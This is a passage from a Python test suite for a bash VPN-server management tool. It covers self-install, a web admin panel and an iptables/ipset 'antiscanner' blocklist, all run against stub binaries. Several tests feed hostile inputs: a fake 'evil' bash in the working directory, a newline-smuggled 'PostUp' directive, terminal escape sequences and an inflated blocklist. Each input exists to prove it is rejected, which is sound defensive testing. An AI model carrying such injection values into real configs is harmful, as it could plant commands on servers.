rc, out, _ = bash("echo -e \"[$(shown $'a\\\\e[31mb\\e[0m\\nc')]\"")
chk("путь в вопросе — без управляющих символов и \\-последовательностей", out.strip() == "[a\\e[31mb?[0m?c]", repr(out))
FAKEBASH = os.path.join(TMP, "evil", "bash")
with open(FAKEBASH, "w") as f:
    f.write('#!/usr/bin/env bash\nVERSION="v9.9.9"\n')
r = subprocess.run(["bash", "-c", PRELUDE + f'SCRIPT_PATH="{TMP}/evil/awg2-target"; VERSION=v1.2.0; AUTO_MODE=1; '
                    'self_install_offer; echo rc=$?', "bash"], cwd=os.path.dirname(FAKEBASH),
                   input="", capture_output=True, text=True, env=ENV, timeout=60)
chk("запуск через curl | bash ($0 = bash): ./bash из текущего каталога не предлагается",
    "rc=0" in r.stdout and not os.path.exists(os.path.join(TMP, "evil", "awg2-target")), r.stdout + r.stderr)

print("\n── Запуск из распакованного архива ──")
INST = os.path.join(TMP, "inst")
os.makedirs(INST)
def selfcopy(build_letter, ver="v1.2.0"):
    path = os.path.join(INST, f"awg2-{ver}{build_letter}.sh")
    with open(path, "w") as f:
        f.write(f'#!/usr/bin/env bash\nVERSION="{ver}"\nBUILD="{build_letter}"\necho {ver}{build_letter}\n')
    return path

def offer(self_path, target, auto=1):
    code = (PRELUDE + f'SCRIPT_PATH="{target}"; VERSION=v1.2.0; BUILD=d; VERSION_SHOW=v1.2.0d; '
            f"AUTO_MODE={auto}; self_install_offer; echo rc=$?")
    r = subprocess.run(["bash", "-c", code, self_path], input="", capture_output=True, text=True, env=ENV, timeout=60)
    return r.stdout + r.stderr

new_d = selfcopy("d")
target = os.path.join(INST, "bin-awg2")
out = offer(new_d, target)
chk("команды awg2 нет — копия из архива ставится в SCRIPT_PATH",
    os.path.exists(target) and open(target).read() == open(new_d).read() and "rc=0" in out, out)
chk("установленная копия исполняемая", os.access(target, os.X_OK), oct(os.stat(target).st_mode))
out = offer(new_d, target)
chk("та же копия — без вопросов", "rc=0" in out and "Установить" not in out, out)
out = offer(target, target)
chk("запуск самой установленной копии — без вопросов", "Установить" not in out, out)
os.replace(selfcopy("c"), target)
out = offer(new_d, target)
chk("установлена v1.2.0c, запущена v1.2.0d — замена, прежняя в .bak",
    "v1.2.0c" in out and open(target).read() == open(new_d).read()
    and "v1.2.0c" in open(target + ".bak").read(), out)
os.replace(selfcopy("", ver="v9.9.9"), target)
out = offer(new_d, target)
chk("установлена более новая — без согласия не откатывается",
    "откатом" in out and "v9.9.9" in open(target).read(), out)
rc, out, _ = bash("_script_ver " + new_d + "; echo; _script_ver " + target)
chk("версия копии читается с буквой сборки", out.split() == ["v1.2.0d", "v9.9.9"], out)

rc, out, _ = bash('server_exists() { return 1; }; cascade_count() { echo 0; }; wgobf_installed() { return 1; }; '
                  'MOD_SRC_DIR=/nonexistent; echo v1.2.0 > "$STATE_DIR/version"; helpers_refresh; cat "$STATE_DIR/version"; '
                  'echo "--$_BUILD_SUM--$VERSION_SHOW"')
mark, _, rest = out.strip().partition("\n--")
bsum, _, ver = rest.partition("--")
chk("служебные скрипты пересобираются и для новой сборки той же версии",
    len(bsum) == 16 and ver.startswith("v1.") and mark == f"{ver} {bsum}", out)

# Xray 26.7+ без имени у входа tun поднимает utunN: обновление awg2 сразу
# ставит имя xray0 в готовый конфиг — служба переживёт перезапуск на новом Xray
XCF = os.path.join(ROOT, "etc/xray/config.json")
os.makedirs(os.path.dirname(XCF), exist_ok=True)
had_xcf = open(XCF).read() if os.path.exists(XCF) else None
with open(XCF, "w") as f:
    json.dump({"inbounds": [{"protocol": "socks", "tag": "socks-in", "port": 10808},
                            {"protocol": "tun", "tag": "tun-in", "settings": {"mtu": 1200}}],
               "outbounds": [{"protocol": "vless", "tag": "A"}], "routing": {"rules": []}}, f)
rc, out, _ = bash('server_exists() { return 1; }; cascade_count() { echo 0; }; wgobf_installed() { return 1; }; '
                  'MOD_SRC_DIR=/nonexistent; echo old > "$STATE_DIR/version"; helpers_refresh')
xcf = json.load(open(XCF))
chk("обновление awg2: у входа tun готового конфига Xray — имя xray0, остальное на месте",
    xcf["inbounds"][1]["settings"] == {"mtu": 1200, "name": "xray0"} and xcf["inbounds"][0] == {"protocol": "socks", "tag": "socks-in", "port": 10808},
    xcf)
for body in ('{"inbounds": [{"protocol": "socks", "tag": "socks-in"}]}', "не json {", '{"inbounds": [{"protocol": "tun", "settings": {"name": "xray0"}}]}'):
    with open(XCF, "w") as f:
        f.write(body)
    os.utime(XCF, (1, 1))
    rc, out, err = bash(f'py xray-tun-name "{XCF}"; echo rc=$?')
    chk(f"xray-tun-name: без tun, не JSON или уже xray0 — файл не трогает ({body[:24]})",
        "rc=0" in out and open(XCF).read() == body and os.stat(XCF).st_mtime == 1, [out, err])
if had_xcf is None:
    os.remove(XCF)
else:
    with open(XCF, "w") as f:
        f.write(had_xcf)

print("\n── Веб-панель (awg2) ──")
WEBC = os.path.join(TMP, "awg-web.conf")
WEBPRE = (f'WEB_CONF="{WEBC}"; WEB_LOG="{TMP}/awg-web.log"; WEB_DIR="{TMP}/awg-web"; BOT_DIR="{TMP}/awg-bot"; '
          'web_code_ready() { return 0; }; AUTO_MODE=0; ')
with open(ACTIVE, "a") as f:
    f.write("awg-web.service\n")
rc, out, _ = bash(WEBPRE + "web_install 2>&1; echo rc=$?", stdin="admin2\nSuperSecret123\nSuperSecret123\n")
out = re.sub(r"\x1b\[[0-9;]*m", "", out)
conf = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
unit = open(os.path.join(ROOT, "units", "awg-web.service")).read()
chk("установка: логин, хеш scrypt вместо пароля, случайные порт и путь, конфиг 600",
    "rc=0" in out and conf.get("WEB_USER") == "admin2" and conf.get("WEB_PASS", "").startswith("scrypt$16384$8$1$")
    and 20000 <= int(conf.get("WEB_PORT", 0)) < 60000 and re.fullmatch(r"[A-Za-z0-9]{14}", conf.get("WEB_PATH", ""))
    and os.stat(WEBC).st_mode & 0o777 == 0o600 and "SuperSecret123" not in open(WEBC).read(), [out[-500:], conf])
chk("введённый пароль на экран не выводится, адрес с портом и секретным путём — выводится",
    "SuperSecret123" not in out and f":{conf.get('WEB_PORT')}/{conf.get('WEB_PATH')}/" in out, out[-500:])
chk("служба awg-web: python -m awgbot.web из кода бота, конфиг и журнал панели",
    "ExecStart=" in unit and "-m awgbot.web" in unit and f"AWG_WEB_CONF={WEBC}" in unit, unit)
old_hash = conf["WEB_PASS"]
rc, out, _ = bash(WEBPRE + "web_install 2>&1", stdin="\n\n")
out = re.sub(r"\x1b\[[0-9;]*m", "", out)
m = re.search(r"Пароль: ([A-Za-z0-9]{18}) ", out)
conf2 = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("Enter вместо пароля — сгенерирован и показан один раз; порт и путь прежние",
    m and conf2["WEB_PASS"] != old_hash and conf2["WEB_PORT"] == conf["WEB_PORT"] and conf2["WEB_PATH"] == conf["WEB_PATH"],
    out[-500:])
rc, out, _ = bash(WEBPRE + "printf '%s' 'Пароль 123' | py web-hash")
chk("хеш пароля: соль каждый раз новая", out.strip().startswith("scrypt$") and out.strip() != conf2["WEB_PASS"], out)
# Порт панели и её правило в UFW: «awg-web» — не подстрока для «awg-webapp» Mini App
UFWST = os.path.join(TMP, "ufw-rules")
with open(UFWST, "w") as f:
    f.write("8443/tcp ALLOW IN Anywhere # awg-webapp\n41234/tcp ALLOW IN Anywhere # awg-web\n"
            "51820/udp ALLOW IN Anywhere # AmneziaWG\n41234/tcp (v6) ALLOW IN Anywhere (v6) # awg-web\n")
UFWFN = ('ufw() { case "$1" in status) awk \'{printf "[%2d] %s\\n", NR, $0}\' "' + UFWST + '" ;; '
         '--force) sed -i "${3}d" "' + UFWST + '" ;; esac; }; ')
rc, out, _ = bash(UFWFN + 'ufw_delete_comment awg-web; cat "' + UFWST + '"')
chk("UFW: правила веб-панели удалены (и v6), порт Mini App «awg-webapp» и AmneziaWG — на месте",
    out.split("\n")[:2] == ["8443/tcp ALLOW IN Anywhere # awg-webapp", "51820/udp ALLOW IN Anywhere # AmneziaWG"]
    and "# awg-web\n" not in out, out)
rc, out, _ = bash(WEBPRE + 'web_port_busy() { return 1; }; web_restart() { :; }; web_show_access() { :; }; '
                  'web_set_port 2>&1 <<< "010000"; web_conf_get WEB_PORT')
chk("порт панели с ведущим нулём — десятичный (10000), а не восьмеричный", out.strip().splitlines()[-1] == "10000", out)
rc, out, _ = bash(WEBPRE + 'web_ask_password 2>&1 <<< "$(printf "%0300d\\n%0300d\\n" 1 1)"; echo "rc=$?"', stdin=None)
chk("пароль длиннее 256 символов — отказ (вход принимает до 256)", "Не больше 256" in out, out[-300:])
rc, out, _ = bash(f'BOT_DIR="{TMP}/botcode"; mkdir -p "$BOT_DIR"; '
                  'web_installed() { true; }; bot_installed && echo BOT || echo NOBOT; '
                  'web_installed() { false; }; bot_installed && echo BOT || echo NOBOT')
chk("код для одной веб-панели — ещё не бот; без панели каталог кода — бот (как раньше)", out.split() == ["NOBOT", "BOT"], out)
rc, out, _ = bash(WEBPRE + "main_menu", stdin="0\n")
chk("главное меню: пункт w) Веб-панель", "w)" in out and "Веб-панель" in out, out[-600:])
# api web — экран «Веб-панель» в боте: адрес, новый пароль, новый путь
WEBAPI = WEBPRE + f'web_installed() {{ [[ -f "{ROOT}/units/awg-web.service" ]]; }}; web_restart() {{ ok "Веб-панель работает"; }}; '
rc, out, _ = bash(WEBAPI + "api_main web status")
st = json.loads(out)["data"]
conf = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("api web status: установлена, адрес с портом и секретным путём, логин; пароля в ответе нет",
    st.get("installed") is True and st.get("url", "").endswith(f":{conf['WEB_PORT']}/{conf['WEB_PATH']}/")
    and st.get("user") == "admin2" and "password" not in st, st)
rc, out, _ = bash(WEBAPI + "api_main web password")
r = json.loads(out)
conf2 = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
pw = (r.get("data") or {}).get("password", "")
chk("api web password: новый пароль — в ответе один раз, на сервере только новый хеш",
    r.get("ok") and re.fullmatch(r"[A-Za-z0-9]{18}", pw) and conf2["WEB_PASS"] != conf["WEB_PASS"]
    and pw not in open(WEBC).read() and pw not in r.get("log", ""), r)
_, n_, r_, p_, salt_, want_ = conf2["WEB_PASS"].split("$")
chk("новый пароль подходит к сохранённому хешу",
    hashlib.scrypt(pw.encode(), salt=base64.b64decode(salt_), n=int(n_), r=int(r_), p=int(p_), dklen=32)
    == base64.b64decode(want_), conf2["WEB_PASS"])
rc, out, _ = bash(WEBAPI + "api_main web path")
r = json.loads(out)
conf3 = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("api web path: новый секретный путь, порт прежний",
    r.get("ok") and conf3["WEB_PATH"] != conf2["WEB_PATH"] and r["data"]["url"].endswith(f"/{conf3['WEB_PATH']}/")
    and conf3["WEB_PORT"] == conf2["WEB_PORT"] and not r["data"].get("password"), r)
rc, out, _ = bash(WEBAPI + "api_main web install")
chk("api web install поверх установленной — отказ (пароль не перезаписывается молча)",
    not json.loads(out).get("ok"), out)
rc, out, _ = bash(WEBPRE + f'remove_unit() {{ rm -f "{ROOT}/units/$1"; }}; ' + "web_remove quiet 2>&1; ls " + f'"{WEBC}" 2>&1; ls "{ROOT}/units/awg-web.service" 2>&1')
chk("удаление: конфиг и служба убраны", "No such file" in out and out.count("No such file") == 2, out)
rc, out, _ = bash(WEBAPI + "ufw_allow() { :; }; api_main web install")
r = json.loads(out)
conf = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("api web install (бот): логин admin, пароль сгенерирован и выдан, случайные порт и путь",
    r.get("ok") and r["data"].get("user") == "admin" and re.fullmatch(r"[A-Za-z0-9]{18}", r["data"].get("password", ""))
    and conf.get("WEB_PASS", "").startswith("scrypt$") and r["data"]["url"].endswith(f":{conf['WEB_PORT']}/{conf['WEB_PATH']}/"),
    r)

print("\n── Антисканер ──")
# Заглушки с состоянием: ipset (наборы — файлами), iptables/ip6tables (правила
# filter и mangle — файлами, -I ставит первым), iptables-save -c (счётчики), curl — отдаёт
# списки из каталога ASLISTS. Сеть не нужна.
ASBIN = os.path.join(TMP, "asbin")
ASLISTS = os.path.join(TMP, "aslists")
IPSET_DIR = os.path.join(TMP, "ipset")
IPT_RULES = os.path.join(TMP, "ipt-rules")
for d in (ASBIN, ASLISTS, os.path.join(IPSET_DIR, "sets"), os.path.join(IPSET_DIR, "gone")):
    os.makedirs(d, exist_ok=True)
AS_STUBS = {
    "ipset": r"""echo "ipset $*" >> "$CALLS"
S="$IPSET_DIR/sets"
case "$1" in
  restore) while read -r op name rest; do
             case "$op" in
               create) touch "$S/$name" ;;
               flush) : > "$S/$name" ;;
               add) e="${rest% -exist}"; echo "$e" >> "$S/$name" ;;
             esac
           done ;;
  create) touch "$S/$2" ;;
  add) e="${*:3}"; e="${e% -exist}"; echo "$e" >> "$S/$2" ;;
  swap) [[ -f "$S/$2" && -f "$S/$3" ]] || exit 1; mv "$S/$2" "$S/.t"; mv "$S/$3" "$S/$2"; mv "$S/.t" "$S/$3" ;;
  destroy) [[ -f "$S/$2" ]] || exit 1; mv -f "$S/$2" "$IPSET_DIR/gone/$2" ;;
  list) if [[ "$2" == -n ]]; then [[ -f "$S/$3" ]] && echo "$3"; [[ -f "$S/$3" ]]; exit; fi
        [[ -f "$S/$2" ]] || exit 1
        echo "Name: $2"; echo "Members:"
        while read -r e flag; do
          n=$(awk -v e="$e" '$1 == e {print $2}' "$IPSET_DIR/hits" 2>/dev/null)
          if [[ "$flag" == nomatch ]]; then echo "$e nomatch packets 0 bytes 0"; else echo "$e packets ${n:-0} bytes 0"; fi
        done < "$S/$2" ;;
esac
exit 0""",
    "iptables": r"""echo "${0##*/} $*" >> "$CALLS"
f="$IPT_RULES.${0##*/}"
if [[ "$1 ${2:-}" == "-t mangle" ]]; then f="$f.mangle"; shift 2; fi
touch "$f"
case "$1" in
  -C) shift; c="$1"; shift; grep -qxF -- "$c $*" "$f" ;;
  -I) shift; c="$1"; shift 2; { echo "$c $*"; cat "$f"; } > "$f.n"; mv "$f.n" "$f" ;;
  -A) shift; c="$1"; shift; echo "$c $*" >> "$f" ;;
  -D) shift; c="$1"; shift; grep -qxF -- "$c $*" "$f" || exit 1
      awk -v r="$c $*" 'BEGIN {d = 0} !d && $0 == r {d = 1; next} {print}' "$f" > "$f.n"; mv "$f.n" "$f" ;;
  -S) echo "-P $2 ACCEPT"; grep "^$2 " "$f" | sed "s/^$2 /-A $2 /" ;;
  *) exit 0 ;;
esac""",
    "iptables-save": r"""t="${0##*/}"; t="${t%-save}"; f="$IPT_RULES.$t"
[[ " $* " == *" -t mangle "* ]] && f="$f.mangle"
if [[ " $* " == *" -c "* ]]; then
  sed "s/^/[$(cat "$f.cnt" 2>/dev/null || echo 0):0] -A /" "$f" 2>/dev/null
else cat "$IPT_SAVE"; fi""",
    "curl": r"""out="" url=""
while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; -*) shift ;; *) url="$1"; shift ;; esac; done
echo "curl $url" >> "$CALLS"
sleep "${FAKE_CURL_SLEEP:-0}"
src="$ASLISTS/${url##*/}"
[[ -f "$src" && -n "$out" ]] || exit 22
cp "$src" "$out" """,
    "ip": r"""if [[ "$*" == "-o addr show scope global" ]]; then
  for a in ${FAKE_ADDRS:-}; do echo "2: eth0    inet $a/24 brd 255.255.255.255 scope global eth0"; done; exit 0
fi
PATH="${PATH#"${0%/*}:"}" exec ip "$@"
""",
    "ss": r"""[[ -n "${FAKE_SSH_PEER:-}" ]] && echo "0 0 203.0.113.10:22 $FAKE_SSH_PEER:51000 users:((\"sshd\",pid=1,fd=4))"
exit 0""",
}
for name, body in AS_STUBS.items():
    with open(os.path.join(ASBIN, name), "w") as f:
        f.write("#!/usr/bin/env bash\n" + body + "\n")
    os.chmod(os.path.join(ASBIN, name), 0o755)
for alias, target in (("ip6tables", "iptables"), ("ip6tables-save", "iptables-save")):
    shutil.copy(os.path.join(ASBIN, target), os.path.join(ASBIN, alias))
# Синтетические списки: мусор, частные сети, слишком широкие — отбрасываются
with open(os.path.join(ASLISTS, "antiscanner.list"), "w") as f:
    f.write("# сканеры\n10.0.0.0/8\n1.0.0.0/4\n999.1.1.0/24\n01.2.3.4\n5.6.7.0/24 # с комментарием\n"
            "8.8.8.8\n192.168.1.0/24\n100.64.1.0/24\nfoo bar\n1.2.3.4/24/5\n"
            "2a0c:a9c7:157::/48\nfe80::/10\n2001:db8::/32\n2a0c::1::2/64\n2a0c:a9c7:158::/48/9\n"
            + "".join(f"31.{i}.0.0/16\n" for i in range(1, 21)))
with open(os.path.join(ASLISTS, "skipa.list"), "w") as f:
    f.write("".join(f"212.41.12.{i}/32\n" for i in range(1, 25)))


def gov_list(n):
    out = []
    for i in range(n):
        out.append(f"# Networks announced by AS{1000 + i}\n# AS-Name: TEST-{i}\n# Org {i} MVD\n# Moscow, Russia\n"
                   f"77.{i // 250}.{i % 250}.0/24\n")
    return "\n".join(out)


with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(320))
ASENV = {"PATH": ASBIN + ":" + ENV["PATH"], "IPSET_DIR": IPSET_DIR, "IPT_RULES": IPT_RULES, "ASLISTS": ASLISTS}
ASPRE = f'export PATH="{ASBIN}:$PATH" IPSET_DIR="{IPSET_DIR}" IPT_RULES="{IPT_RULES}" ASLISTS="{ASLISTS}"; '


def ipset_set(name):
    try:
        return open(os.path.join(IPSET_DIR, "sets", name)).read().split("\n")[:-1]
    except OSError:
        return None


def ipt(fam=4):
    try:
        return open(f"{IPT_RULES}.{'iptables' if fam == 4 else 'ip6tables'}").read().split("\n")[:-1]
    except OSError:
        return []


rc, out, _ = bash(f'_antiscan_parse 4 < "{ASLISTS}/antiscanner.list" | head -4')
chk("разбор IPv4: мусор, частные и слишком широкие сети отброшены",
    out.split()[:3] == ["5.6.7.0/24", "8.8.8.8/32", "31.1.0.0/16"], out)
rc, out, _ = bash(f'_antiscan_parse 6 < "{ASLISTS}/antiscanner.list"')
chk("разбор IPv6: только глобальные, без link-local, документационных и кривых", out.split() == ["2a0c:a9c7:157::/48"], out)
rc, out, _ = bash('printf "10.1.2.3\\n1.2.3.4/8\\n1.2.3.4/7\\n" | _antiscan_parse 4 1')
chk("исключения: частные адреса можно, но не шире /8", out.split() == ["10.1.2.3/32", "1.0.0.0/8"], out)
# Одинокое «:» с краю — не IPv6: одна такая запись роняла бы весь ipset restore (набор IPv6 снимался целиком)
for mode in ("0", "1"):
    rc, out, _ = bash(f'printf "2a0c::1:\\n:2a0c::1\\n1::2:\\n::1:\\n2a0c:1::\\n2a0c::1\\n" | _antiscan_parse 6 {mode}')
    chk(f"разбор IPv6 (allow={mode}): одинокое «:» с краю отброшено, верные записи остались",
        out.split() == ["2a0c:1::/128", "2a0c::1/128"], out)

reset_calls()
r = api("antiscan", "on", env=dict(ASENV, FAKE_SSH_PEER="77.0.5.9", SSH_CONNECTION="77.0.7.7 5000 203.0.113.10 22"))
v4 = ipset_set("awg2-antiscan") or []
chk("api antiscan on: списки скачаны, набор собран, правило первым в INPUT",
    r.get("ok") and "31.1.0.0/16" in v4 and "212.41.12.1/32" in v4 and "77.0.5.0/24" in v4
    and "10.0.0.0/8" not in v4 and ipt(4)[:1] == ["INPUT -m conntrack --ctstate NEW -m set --match-set awg2-antiscan src "
                                                  "-m comment --comment awg2-antiscan -j DROP"], [r, ipt(4), v4[:5]])
chk("IPv6 — свой набор и правило в ip6tables", ipset_set("awg2-antiscan6") == ["2a0c:a9c7:157::/48"]
    and any("awg2-antiscan6" in x for x in ipt(6)), [ipset_set("awg2-antiscan6"), ipt(6)])
allow = open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
chk("SSH-адреса из списка — в исключения насовсем, в наборе nomatch",
    "77.0.7.7 # SSH" in allow and "77.0.5.9 # SSH" in allow
    and "77.0.7.7/32 nomatch" in v4 and "77.0.5.9/32 nomatch" in v4, [allow, [x for x in v4 if "nomatch" in x]])
units = os.listdir(os.path.join(ROOT, "units"))
svc = open(os.path.join(ROOT, "units", "awg2-antiscan.service")).read()
chk("служба при загрузке — раньше UFW и netfilter-persistent; таймер раз в час",
    {"awg2-antiscan.service", "awg2-antiscan-update.service", "awg2-antiscan-update.timer"} <= set(units)
    and "Before=network-pre.target ufw.service netfilter-persistent.service" in svc
    and "systemctl enable --now awg2-antiscan-update.timer" in calls(), units)

with open(f"{IPT_RULES}.iptables.cnt", "w") as f:
    f.write("42")
with open(os.path.join(IPSET_DIR, "hits"), "w") as f:
    f.write("77.0.3.0/24 30\n31.2.0.0/16 12\n")
r = api("antiscan", "status", env=ASENV)
d = r.get("data") or {}
lists = {x["id"]: x for x in d.get("lists") or []}
chk("api antiscan status: включён, правило на месте, счётчик, списки, кто стучался — с организацией",
    r.get("ok") and d.get("enabled") and d.get("active") and d.get("dropped") == 42 and d.get("v4", 0) > 340
    and lists["gov"]["entries"] == 320 and lists["scan"]["on"]
    and d["top"][0] == {"packets": 30, "net": "77.0.3.0/24", "org": "Org 3 MVD"}
    and "77.0.7.7" in d.get("allow", []), d)

# Оборванный ответ не заменяет прежний список
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(12))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("короткий ответ сервера списков — прежний список остаётся, ошибка сказана",
    r.get("ok") and {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "оставлен прежний" in d.get("error", ""),
    [r, d])
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write("".join(f"{20 + i // 16777216}.{i // 65536 % 256}.{i // 256 % 256}.{i % 256}\n" for i in range(200001)))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("раздутый ответ (больше предела применения) — прежний список остаётся, а не ломает применение",
    r.get("ok") and {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "оставлен прежний" in d.get("error", ""),
    [r, d.get("error"), d.get("lists")])
# Подменённый источник: тысячи /12 — записей в меру, но закрыли бы почти весь IPv4
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write("".join(f"{i // 16 % 223 + 1}.{i % 16 * 16}.0.0/12\n" for i in range(3500)))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("охват шире 2^24 адресов IPv4 (тысячи /12) — прежний список остаётся, ошибка в статусе и журнале",
    {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "охват" in d.get("error", "")
    and "охват" in open(os.path.join(ROOT, "antiscan.log")).read(), [r, d.get("error"), d.get("lists")])
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(320) + "\n" + "".join(f"2a{i:02x}:ff00::/24\n" for i in range(20)))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("IPv6: охват больше 4096 сетей /32 — прежний список остаётся",
    {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "охват" in d.get("error", ""), [r, d.get("error")])
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(320))

# Правило сдвинули (fail2ban вставил своё первым) — таймер возвращает его наверх без скачивания
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("INPUT -j f2b-sshd\n" + "\n".join(x for x in ipt(4) if "f2b" not in x) + "\n")
api("antiscan", "update", env=ASENV)           # ошибка прошлого шага ушла, UPDATED свежий
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("INPUT -j f2b-sshd\n" + "\n".join(x for x in ipt(4) if "f2b" not in x) + "\n")
reset_calls()
rc, out, err = bash(ASPRE + 'bash "$ANTISCAN_SCRIPT" heal; echo "rc=$?"')
chk("таймер: правило снова первое, списки не качались (обновлены меньше суток назад)",
    "rc=0" in out and ipt(4)[0].endswith("--comment awg2-antiscan -j DROP") and "curl" not in calls()
    and ipt(4).count("INPUT -j f2b-sshd") == 1, [out, err, ipt(4)])
# Выше нашего — DROP обфускатора и ACCEPT DNS только с awg0: сканер через них не
# пройдёт, правило не двигается (и не дёргается каждый час)
OURS = [x for x in ipt(4) if "awg2-antiscan" in x]
SAFE = ["INPUT ! -i lo -p udp --dport 51821 -j DROP -m comment --comment awg-wgobf",
        "INPUT -i awg0 -d 10.23.45.1 -p udp --dport 5353 -j ACCEPT -m comment --comment awg2-dns"]
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("\n".join(SAFE + OURS + ["INPUT -j ufw-before-input"]) + "\n")
reset_calls()
rc, out, _ = bash(ASPRE + 'antiscan_rules_ok && echo OK; bash "$ANTISCAN_SCRIPT" heal')
chk("туннели Тулзы выше правила (DROP обфускатора, DNS с awg0) — правило на месте, не двигается",
    "OK" in out and ipt(4)[:3] == SAFE + OURS[:1] and "-D INPUT" not in calls(), [out, ipt(4)])
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("\n".join(["INPUT -j ufw-before-input", "INPUT ! -i awg0 -p tcp --dport 22 -j ACCEPT"] + OURS) + "\n")
rc, out, _ = bash(ASPRE + 'antiscan_rules_ok || echo MOVED; bash "$ANTISCAN_SCRIPT" heal')
chk("переход в UFW или ACCEPT не только для своих интерфейсов выше — правило снова наверх",
    "MOVED" in out and "awg2-antiscan" in ipt(4)[0], [out, ipt(4)])
rc, out, _ = bash(ASPRE + 'sed -i "s/^UPDATED=.*/UPDATED=1/" "$ANTISCAN_CONF"; bash "$ANTISCAN_SCRIPT" heal; '
                  'grep -c "^curl" "$CALLS"')
chk("таймер: списки старше суток — скачивает заново", out.strip().endswith("3"), out)

# Адреса сервера: на загрузке (служба раньше сети) их нет, при смене адреса исключения
# устаревают — таймер пересобирает набор без скачивания; тот же набор адресов не трогает
rc, out, _ = bash(ASPRE + 'FAKE_ADDRS="77.0.9.9" bash "$ANTISCAN_SCRIPT" apply; echo "rc=$?"')
a1 = "77.0.9.9/32 nomatch" in (ipset_set("awg2-antiscan") or [])
reset_calls()
rc, out2, _ = bash(ASPRE + 'FAKE_ADDRS="77.0.9.9" bash "$ANTISCAN_SCRIPT" heal; echo "rc=$?"')
a2 = "ipset restore" not in calls()
rc, out3, _ = bash(ASPRE + 'FAKE_ADDRS="77.0.9.9 77.0.8.8" bash "$ANTISCAN_SCRIPT" heal; echo "rc=$?"')
a3 = "77.0.8.8/32 nomatch" in (ipset_set("awg2-antiscan") or []) and "curl" not in calls()
chk("таймер: адреса сервера те же — набор не пересобирается; сменились — исключения обновлены без скачивания",
    a1 and a2 and a3 and "rc=0" in out + out2 + out3, [a1, a2, a3, out, out2, out3])
# Прерванная загрузка оставляет временный набор — выключение убирает и его
open(os.path.join(IPSET_DIR, "sets", "awg2-antiscan-new"), "w").close()
rc, out, _ = bash(ASPRE + 'antiscan_down')
chk("выключение убирает временный набор прерванной загрузки",
    ipset_set("awg2-antiscan-new") is None and ipset_set("awg2-antiscan") is None, [out, ipset_set("awg2-antiscan-new")])
api("antiscan", "update", env=ASENV)   # вернуть набор для следующих проверок

r = api("antiscan", "allow", "add", "8.8.4.0/24", env=ASENV)
r2 = api("antiscan", "allow", "add", "1.2.3.4\nPostUp = x", env=ASENV)
r3 = api("antiscan", "allow", "add", "300.1.1.1", env=ASENV)
chk("исключение: подсеть добавлена и сразу в наборе (nomatch); мусор — отказ",
    r.get("ok") and "8.8.4.0/24 nomatch" in (ipset_set("awg2-antiscan") or []) and not r2.get("ok") and not r3.get("ok"),
    [r, r2, r3])
r = api("antiscan", "allow", "del", "8.8.4.0/24", env=ASENV)
r2 = api("antiscan", "allow", "del", "9.9.9.9", env=ASENV)
chk("исключение убрано; несуществующее — ошибка",
    r.get("ok") and "8.8.4.0" not in open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read() and not r2.get("ok"),
    [r, r2])
r = api("antiscan", "allow", "add", "1.0.0.0/4", env=ASENV)
r2 = api("antiscan", "allow", "add", "2a0c::/8", env=ASENV)
r3 = api("antiscan", "allow", "add", "300.1.1.1/4", env=ASENV)
chk("исключение шире /8 (IPv4) или /16 (IPv6) — своим текстом, а не «нужен адрес»",
    "Слишком широкая" in r.get("error", "") and "Слишком широкая" in r2.get("error", "")
    and "Нужен IPv4 или IPv6" in r3.get("error", ""), [r.get("error"), r2.get("error"), r3.get("error")])

# Широкое исключение перекрывает узкие записи списка: в hash:net побеждает самый
# узкий префикс, поэтому записи внутри исключения в набор не идут
api("antiscan", "allow", "add", "212.41.12.0/24", env=ASENV)
api("antiscan", "allow", "add", "31.1.2.0/24", env=ASENV)
r = api("antiscan", "allow", "add", "2a0c:a9c7::/32", env=ASENV)
v4, v6 = ipset_set("awg2-antiscan") or [], ipset_set("awg2-antiscan6") or []
chk("исключение шире записей списка: записи внутри него не в наборе (IPv4 и IPv6), шире — остаются",
    r.get("ok") and not any(x.startswith("212.41.12.") and "nomatch" not in x for x in v4)
    and "212.41.12.0/24 nomatch" in v4 and "31.1.0.0/16" in v4 and "31.1.2.0/24 nomatch" in v4
    and "2a0c:a9c7:157::/48" not in v6, [r, [x for x in v4 if x.startswith(("212.", "31.1."))], v6])
for a in ("212.41.12.0/24", "31.1.2.0/24", "2a0c:a9c7::/32"):
    api("antiscan", "allow", "del", a, env=ASENV)
chk("исключение убрано — записи списка снова в наборе",
    "212.41.12.5/32" in (ipset_set("awg2-antiscan") or []) and "2a0c:a9c7:157::/48" in (ipset_set("awg2-antiscan6") or []),
    [ipset_set("awg2-antiscan6")])

# Адрес того, кто включает из панели или Mini App (AWG_CLIENT_IP от бота), и
